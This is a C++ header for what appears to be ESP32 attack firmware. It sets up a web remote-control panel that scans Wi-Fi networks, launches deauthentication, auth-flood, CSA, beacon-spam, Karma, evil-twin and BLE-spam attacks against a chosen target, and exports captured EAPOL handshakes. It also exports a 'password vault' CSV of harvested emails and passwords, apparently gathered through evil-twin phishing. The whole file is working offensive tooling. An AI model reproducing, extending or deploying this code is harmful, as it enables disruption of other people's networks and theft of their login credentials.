#ifndef WEB_REMOTE_H
#define WEB_REMOTE_H

#include <WebServer.h>
#include <WiFi.h>
#include <Preferences.h>
#include "attack_engine.h"
#include "web_utils.h"
#include "web_ui.h"

extern WebServer server;
extern State currentState;
extern void startDeauthEngine();
extern void startBeaconSpam();
extern void startGlobalDeauth();
extern void startProbeSniffer();
extern void startBTSpam();
extern void startEvilTwinWithDeauth();
extern void startAuthFlood();
extern void startCSAAttack();
extern void startKarmaScan();
extern int selectedTemplateIdx;
extern int verifyAttempts;
extern int verifyState;
extern void stopAllAttacks();
extern void stopAttacksKeepWebRemote();
extern uint8_t g_targetBSSID[6];
extern volatile uint8_t g_targetChannel;
extern volatile uint32_t g_packetsSent;
extern volatile uint32_t g_txErrors;
extern String targetSSID;
extern Preferences prefs;
extern int cfg_deauth_burst;
extern int cfg_deauth_reason;
extern int cfg_auth_burst;
extern int cfg_hop_interval_ms;
extern int cfg_beacon_hop_ms;
extern void saveConfig();
extern String cfg_wifi_ssid;
extern String cfg_wifi_pass;
extern String cfg_server_url;
extern int cfg_autosync_min;
extern int readBatteryPercent();
extern TaskHandle_t attackTaskHandle;
extern String cfg_template_url;
extern String buildEapolJson();
extern bool isEapolRunning;

// HTML UI


inline void setupWebRemote() {
  // Halaman utama remote control
  server.on("/rc", []() {
    server.send_P(200, "text/html", HTML_REMOTE);
  });

  // Status live untuk UI
  server.on("/api/status", []() {
    String json = "{\"uptime\":" + String(millis() / 1000UL) +
                  ",\"heap\":" + String(ESP.getFreeHeap()) +
                  ",\"packets\":" + String((uint32_t)g_packetsSent) +
                  ",\"txerrors\":" + String((uint32_t)g_txErrors) +
                  ",\"mode\":" + String((int)currentState) +
                  ",\"battery\":" + String(readBatteryPercent()) +
                  ",\"temp\":" + String((int)temperatureRead()) +
                  ",\"stack\":" + String(attackTaskHandle ? (int)uxTaskGetStackHighWaterMark(attackTaskHandle) : 0) +
                  ",\"target\":\"" + jsonEscape(targetSSID) + "\"}";
    server.send(200, "application/json", json);
  });

  // Config attack (read)
  server.on("/api/config", HTTP_GET, []() {
    String json = "{\"deauth\":" + String(cfg_deauth_burst) +
                  ",\"auth\":" + String(cfg_auth_burst) +
                  ",\"hop\":" + String(cfg_hop_interval_ms) +
                  ",\"beacon\":" + String(cfg_beacon_hop_ms) +
                  ",\"reason\":" + String(cfg_deauth_reason) +
                  ",\"wifi\":\"" + jsonEscape(cfg_wifi_ssid) + "\"" +
                  ",\"wifipass\":\"" + jsonEscape(cfg_wifi_pass) + "\"" +
                  ",\"url\":\"" + jsonEscape(cfg_server_url) + "\"" +
                  ",\"tpl\":\"" + jsonEscape(cfg_template_url) + "\"" +
                  ",\"autosync\":" + String(cfg_autosync_min) + "}";
    server.send(200, "application/json", json);
  });

  // Config attack (save)
  server.on("/api/config", HTTP_POST, []() {
    if (server.hasArg("deauth")) cfg_deauth_burst = constrain(server.arg("deauth").toInt(), 1, 100);
    if (server.hasArg("auth"))   cfg_auth_burst = constrain(server.arg("auth").toInt(), 1, 200);
    if (server.hasArg("hop"))    cfg_hop_interval_ms = constrain(server.arg("hop").toInt(), 20, 2000);
    if (server.hasArg("beacon")) cfg_beacon_hop_ms = constrain(server.arg("beacon").toInt(), 20, 2000);
    if (server.hasArg("reason")) cfg_deauth_reason = constrain(server.arg("reason").toInt(), 0, 16);
    if (server.hasArg("wifi")) cfg_wifi_ssid = server.arg("wifi");
    if (server.hasArg("wifipass")) cfg_wifi_pass = server.arg("wifipass");
    if (server.hasArg("url")) cfg_server_url = server.arg("url");
    if (server.hasArg("tpl")) cfg_template_url = server.arg("tpl");
    if (server.hasArg("autosync")) cfg_autosync_min = constrain(server.arg("autosync").toInt(), 0, 1440);
    saveConfig();
    server.send(200, "text/plain", "Config Saved");
  });

  // Scan WiFi
  server.on("/api/scan", []() {
    int n = WiFi.scanNetworks();
    String json = "[";
    for (int i = 0; i < n; i++) {
      if (i > 0) json += ",";
      json += "{\"mac\":\"" + jsonEscape(WiFi.BSSIDstr(i)) + "\",\"ssid\":\"" + jsonEscape(WiFi.SSID(i)) + "\",\"rssi\":" + String(WiFi.RSSI(i)) + ",\"ch\":" + String(WiFi.channel(i)) + "}";
    }
    json += "]";
    server.send(200, "application/json", json);
  });

  // Mulai Deauth ke target
  server.on("/api/attack", []() {
    if (server.hasArg("mac") && server.hasArg("ch") && server.hasArg("ssid")) {
      String macStr = server.arg("mac");
      String ssid = server.arg("ssid");
      g_targetChannel = server.arg("ch").toInt();
      targetSSID = ssid;

      int values[6];
      sscanf(macStr.c_str(), "%x:%x:%x:%x:%x:%x",
             &values[0], &values[1], &values[2], &values[3], &values[4], &values[5]);
      for (int i = 0; i < 6; i++) g_targetBSSID[i] = (uint8_t)values[i];

      String mode = server.hasArg("mode") ? server.arg("mode") : "deauth";
      server.send(200, "text/plain", "Attack Started");

      if (mode == "evil") {
        stopAllAttacks();
        selectedTemplateIdx = 0;
        verifyAttempts = 0;
        verifyState = 0;
        currentState = EVIL_TWIN_RUNNING;
        startEvilTwinWithDeauth();
      } else {
        stopAttacksKeepWebRemote();
        currentState = WEB_REMOTE;
        if (mode == "auth") {
          startAuthFlood();
        } else if (mode == "csa") {
          startCSAAttack();
        } else {
          startDeauthEngine();
        }
      }
    } else {
      server.send(400, "text/plain", "Bad Request");
    }
  });

  // Stop semua
  server.on("/api/stop", []() {
    stopAttacksKeepWebRemote();
    currentState = WEB_REMOTE;
    server.send(200, "text/plain", "Stopped");
  });

  // Quick start modul lain
  server.on("/api/start/beacon", []() {
    server.send(200, "text/plain", "Beacon Started");
    stopAttacksKeepWebRemote();
    currentState = WEB_REMOTE;
    startBeaconSpam();
  });
  server.on("/api/start/global", []() {
    server.send(200, "text/plain", "Global Started");
    stopAttacksKeepWebRemote();
    currentState = WEB_REMOTE;
    startGlobalDeauth();
  });
  server.on("/api/start/probe", []() {
    server.send(200, "text/plain", "Probe Started");
    stopAttacksKeepWebRemote();
    currentState = WEB_REMOTE;
    startProbeSniffer();
  });
  server.on("/api/start/ble", []() {
    server.send(200, "text/plain", "BLE Started - WiFi off, Web Remote disconnected");
    stopAllAttacks();
    currentState = BT_SPAM;
    startBTSpam();
  });
  server.on("/api/start/karma", []() {
    server.send(200, "text/plain", "Karma Started");
    stopAttacksKeepWebRemote();
    currentState = WEB_REMOTE;
    startKarmaScan();
  });

  // EAPOL status/export
  server.on("/api/eapol", []() {
    server.send(200, "application/json", buildEapolJson());
  });

  // Export Probe Sniff CSV
  server.on("/api/export/probe", []() {
    String csv = "mac,rssi,ssid\r\n";
    portENTER_CRITICAL(&g_probeLogMux);
    int cnt = g_probeLogCount;
    int head = g_probeLogHead;
    ProbeEntry snap[PROBE_LOG_SIZE];
    for (int i = 0; i < cnt; i++) {
      int idx = (head - cnt + i + PROBE_LOG_SIZE) % PROBE_LOG_SIZE;
      snap[i] = g_probeLog[idx];
    }
    portEXIT_CRITICAL(&g_probeLogMux);
    for (int i = 0; i < cnt; i++) {
      char mac[18];
      snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
               snap[i].mac[0], snap[i].mac[1], snap[i].mac[2],
               snap[i].mac[3], snap[i].mac[4], snap[i].mac[5]);
      String ssid = snap[i].ssid[0] ? String(snap[i].ssid) : String("(hidden)");
      csv += String(mac) + "," + String(snap[i].rssi) + "," + csvField(ssid) + "\r\n";
    }
    server.sendHeader("Content-Disposition", "attachment; filename=probe.csv");
    server.send(200, "text/csv", csv);
  });

  // Export Karma CSV
  server.on("/api/export/karma", []() {
    String csv = "ssid,probe_count,auth_count\r\n";
    for (int i = 0; i < g_karmaSSIDCount; i++) {
      csv += csvField(String(g_karmaSSIDs[i].ssid)) + "," + String(g_karmaSSIDs[i].probeCount) + "," + String(g_karmaSSIDs[i].authCount) + "\r\n";
    }
    server.sendHeader("Content-Disposition", "attachment; filename=karma.csv");
    server.send(200, "text/csv", csv);
  });

  // Export Password Vault CSV
  server.on("/api/export/passwords", []() {
    int total = prefs.getInt("pwd_count", 0);
    String csv = "email,password,verified\r\n";
    for (int i = 0; i < total; i++) {
      String entry = prefs.getString(("pwd_" + String(i)).c_str(), "");
      int p1 = entry.indexOf('|');
      String email = (p1 > 0) ? entry.substring(0, p1) : entry;
      String rest = (p1 > 0) ? entry.substring(p1 + 1) : "";
      int p2 = rest.indexOf('|');
      String pass = (p2 > 0) ? rest.substring(0, p2) : rest;
      String ver = (p2 > 0) ? rest.substring(p2 + 1) : "";
      csv += csvField(email) + "," + csvField(pass) + "," + ver + "\r\n";
    }
    server.sendHeader("Content-Disposition", "attachment; filename=passwords.csv");
    server.send(200, "text/csv", csv);
  });
}

#endif
